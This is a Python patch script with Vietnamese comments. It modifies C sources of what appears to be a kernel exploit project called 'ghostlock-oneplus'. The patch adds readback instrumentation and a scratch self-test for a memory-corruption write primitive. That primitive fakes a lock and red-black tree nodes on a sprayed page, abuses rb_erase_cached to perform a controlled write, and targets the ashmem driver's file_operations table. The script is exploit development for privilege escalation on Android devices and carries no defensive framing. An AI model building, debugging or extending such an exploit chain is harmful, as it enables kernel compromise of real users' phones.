#!/usr/bin/env python3
"""patch_ssopt_peek.py

Instrumentation CHỈ-ĐỌC cho route setsockopt: đọc lại các ô của trang giả qua
MAP_SHARED (page-relative = payload_offset + SKB_DATA_DELTA) để biết walk đã làm
gì, KHÔNG cần đánh vào ashmem.

Các mốc:
  page[0x00]      fake_lock->wait_lock      (walk đã trylock/unlock)
  page[0x08]      fake_lock->waiters.rb_root.rb_node
  page[0x10]      fake_lock->waiters.rb_leftmost
  page[0x310]     W0->tree_entry.rb_left    (rb_link_node của chain[7] enqueue)
  page[0x318]     W0->pi_tree.parent_color  (= write_pc, sau đó RB_CLEAR_NODE(self))
  page[0x320]     W0->pi_tree.rb_right      (= write_right)
  page[0x110]     fake_fops->read           (không nên đổi)
  page[0x108]     fake_fops->llseek         -> == ASHMEM alias nếu [7] đã ghi
  page[0x3C0]     RIGHT_OFF slot            -> == fake_fops nếu WRITE4_SCRATCH

Bật bằng SSOPT_PEEK=1.
"""
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()

# 1) helper macro (page-relative offset from a payload offset)
old = """int sock_paint_fd = -1;"""
new = """int sock_paint_fd = -1;

/* payload offset -> page-relative offset of the leaked fake page
 * (payload_base = base + SKB_DATA_DELTA) */
#define SSOPT_PG(payload_off) ((size_t)((int64_t)(payload_off) + (SKB_DATA_DELTA)))"""
assert s.count(old) == 1, ("macro anchor", s.count(old))
s = s.replace(old, new, 1)

# 2) fix the scratch readback offset + add the read-only peek block
old = """    if (env_flag("WRITE4_SCRATCH", 0)) {
      /* Self-test of the whole chain (paint -> chain[7] rb_erase_cached ->
       * write) with the target inside our own page: page[SCRATCH_OFF+0x40]
       * must become ssopt_write_pc (== fake_fops).  Zero risk for ashmem. */
      pr_info("ssopt scratch readback +%.0fms walked=%d page[%#x]=%016zx "
              "want=%016zx\\n",
              fops_elapsed_ms(&t0), atomic_load(&pselect_walk_done),
              (unsigned)(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_page_readback(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_write_pc);
    }"""
new = """    if (env_flag("WRITE4_SCRATCH", 0)) {
      /* Self-test of the whole chain (paint -> chain[7] rb_erase_cached ->
       * write) with the target inside our own page: page[SSOPT_PG(SCRATCH+0x40)]
       * must become ssopt_write_pc (== fake_fops).  Zero risk for ashmem. */
      pr_info("ssopt scratch readback +%.0fms walked=%d page[%#zx]=%016zx "
              "want=%016zx\\n",
              fops_elapsed_ms(&t0), atomic_load(&pselect_walk_done),
              SSOPT_PG(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF + 0x40)),
              (uintptr_t)ssopt_write_pc);
    }
    if (env_flag("SSOPT_PEEK", 0)) {
      /* Read-only view of what the walk did to the fake page.  page[0x108]
       * (fake_fops->llseek) becomes the rb_right value only if chain[7]
       * rb_erase_cached() actually ran with our painted tree_entry. */
      pr_info("ssopt peek walked=%d pc=%016zx right=%016zx misc_fops=%016zx\\n",
              atomic_load(&pselect_walk_done),
              (uintptr_t)ssopt_write_pc, (uintptr_t)ssopt_write_right,
              (uintptr_t)data_addr(ASHMEM_MISC_FOPS));
      pr_info("ssopt peek lock[wlock=%016zx rb_root=%016zx leftmost=%016zx] "
              "W0[rb_l=%016zx pi_pc=%016zx pi_r=%016zx pi_l=%016zx] "
              "fops[read=%016zx llseek=%016zx] right_slot=%016zx scratch=%016zx\\n",
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x00),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x08),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x18),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x20),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x28),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x08),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(RIGHT_OFF) + 0x00),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF) + 0x40));
    }"""
assert s.count(old) == 1, ("readback anchor", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: fixed scratch offset (SSOPT_PG) + SSOPT_PEEK read-only peek")

# 3) allow the zero-risk scratch target in the DEFAULT mode-4 path too
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()
old = """    } else {
      fake_parent = fake_fops;
      fake_right = data_addr(ASHMEM_MISC_FOPS);
      fake_left = 0;
    }"""
new = """    } else {
      fake_parent = fake_fops;
      fake_right = data_addr(ASHMEM_MISC_FOPS);
      if (env_flag("WRITE4_SCRATCH", 0))
        fake_right = payload_base + SCRATCH_OFF + 0x40; /* harmless: our page */
      fake_left = 0;
    }"""
assert u.count(old) == 1, ("util default branch", u.count(old))
u = u.replace(old, new, 1)
open(U, "w").write(u)
print("util.c: WRITE4_SCRATCH now also works in the default mode-4 path")
